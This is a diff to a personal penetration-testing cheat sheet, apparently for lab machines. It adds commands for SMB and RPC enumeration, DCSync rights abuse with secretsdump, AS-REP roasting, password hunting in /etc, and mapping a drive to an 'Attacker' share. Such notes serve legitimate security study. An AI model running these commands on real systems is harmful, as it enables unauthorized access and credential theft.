@@ -28,8 +28,9 @@
     - -A os, in-build scripts
     - -sC default scripts
     - -F: fast mode, fewer ports
-  - SSL scan
+  - scripts
     - --script ssl*
+    - fpt-anon
 
   - scripts
     - --script=nfs-ls,nfs-statfs,nfs-showmount
@@ -159,6 +160,8 @@
 
 - find users:
   - rpcclient -U "" -N $target
+  - rpcclient -U'%' $TARGET
+    - enumdomusers
 ```
 # Brute-Force users RIDs
 for i in $(seq 500 1100); do
@@ -184,7 +187,6 @@ done
     -  GetNPUsers.py -dc-ip $target -outputfile kerberos_hashes.txt -request -debug $Domain/User -no-pass
  
 #### Privege Escalation
-
 - **GenericAll**
   - create computer
 - **WriteDACL**
@@ -195,19 +197,31 @@ done
 
 - Create object credential  
 ```
-pass = convertto-securestring 'abc123!' -asplain -force
+$username = 'plaintext'
+$password = 'Password123'
+pass = convertto-securestring $password -asplain -force
+
+# Option 1
 $cred = new-object system.management.automation.pscredential('htb\john', $pass)
+
+# Option 2
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+
 Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
+
+New-PSDrive -Name "N" -Root "\\Attacker\share" -PSProvider "FileSystem" -Credential $cred
 ``` 
 - run *secretsdump* (impackt) with new user to retrieve hashes
 
 ### SMB
 - SMBMAP
   - smbmap -H $target = Check Privileges 
-  - smbmap -H $target -R --depth 5
+  - smbmap -H $target -r share --depth 5
+    - --download "share\file.txt"
   - smbmap -H $target -u Administrator -p 'Password@1' 
+- rpclient -U '%'
 - SMB-CLIENT: write/read
-- smbclient -L //$target/ = List Shares
+- smbclient -N -L //$target/ = List Shares
 - smbclient -L //$target -U admin/administrator
 - smbclient //$target/Users = Interactive shell to a share
   - mask ""
@@ -227,9 +241,17 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - smb-protocols
   - smb-enum-shares
   - smb-vuln*
-- mount
+- **mount**
   - mkdir -p /mnt/SHARE
   - mount -v -t cifs //$TARGET/share -o 'username=USER,password=PASS' /mnt/SHARE
+  - sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //$TARGET/share /mnt/share
+  - mount -t cifs //$TARGET/share /mnt/share -o credentials=/path/credentialfile
+```
+# Credential file
+username=plaintext
+password=Password123
+domain=.
+```
 - Online tips:
   - [smb enum](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
 - psexec.py user:pass@$target COMMAND
@@ -275,6 +297,7 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
   - grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null
   - grep --color=auto -rnw '/etc' -ie "Password" --color=always 2>/dev/null
   - find /etc -type f -exec grep -i -I "pass" {} /dev/null \;
+  - 
 - Read all files in a folder
   - find /path/target -type f -exec cat {} +
   - find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep blabla = hidden
@@ -286,7 +309,9 @@ Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync
 
 - Network
   - route
-  - netstat -rn
+  - netstat 
+    - -tlnp
+    - -rn
   - /etc/resolv.conf
   - arp -a
 - lscpu
